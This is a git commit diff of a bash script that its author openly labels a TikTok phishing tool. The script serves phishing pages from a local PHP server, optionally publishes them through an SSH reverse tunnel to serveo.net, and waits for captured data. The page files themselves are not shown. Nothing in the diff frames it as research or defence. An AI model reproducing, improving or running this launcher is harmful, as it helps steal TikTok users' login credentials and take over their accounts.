a56c5d24904ef4874d2801240cbb8c0ab7bec572
pakhtoon711 <ppakhtoon793@gmail.com>
2026-06-20 11:38:39 +0500

    Rename tool and update options for TikTok phishing

--- tool.sh
+++ tool.sh
@@ -1,34 +1,45 @@
 #!/bin/bash
-# Waseem Advanced Phishing Tool
+# Waseem Hacker Advanced Script
 
-# Kill previous instances to avoid errors
 killall php > /dev/null 2>&1
 killall ssh > /dev/null 2>&1
 
 clear
 echo "####################################"
-echo "#      WASEEM ADVANCED TOOL        #"
+echo "#       TIKTOK PHISHING TOOL       #"
+echo "#        Created by Waseem Hacker  #"
 echo "####################################"
 echo ""
-echo "[1] Localhost (Only for testing)"
-echo "[2] Serveo (Public Link)"
-echo "[3] Exit"
+echo "[1] TikTok"
+echo "[2] Exit"
 echo ""
-read -p "Select an option: " option
+read -p "Select an option: " opt1
 
-if [ $option == 1 ]; then
-    echo "[*] Starting Local Server on 127.0.0.1:8080..."
-    php -S 127.0.0.1:8080 -t pages/
-elif [ $option == 2 ]; then
-    echo "[*] Starting Local Server..."
-    php -S 127.0.0.1:8080 -t pages/ > /dev/null 2>&1 &
-    echo "[*] Starting Serveo Tunneling..."
-    ssh -R 80:127.0.0.1:8080 serveo.net
-elif [ $option == 3 ]; then
+if [ $opt1 == 1 ]; then
+    clear
+    echo "####################################"
+    echo "#         SELECT SERVER            #"
+    echo "####################################"
+    echo "[1] Localhost"
+    echo "[2] Serveo (Public Link)"
+    echo ""
+    read -p "Select Server: " opt2
+
+    if [ $opt2 == 1 ]; then
+        echo "[*] Starting Localhost..."
+        php -S 127.0.0.1:8080 -t pages/
+    elif [ $opt2 == 2 ]; then
+        echo "[*] Starting Server and Tunneling..."
+        php -S 127.0.0.1:8080 -t pages/ > /dev/null 2>&1 &
+        ssh -R 80:127.0.0.1:8080 serveo.net
+    fi
+
+    echo "[*] Waiting for data..."
+    sleep 9999
+
+elif [ $opt1 == 2 ]; then
     echo "Exiting..."
     exit
 else
     echo "Invalid option!"
 fi
-
-echo "[*] Waiting for data..."
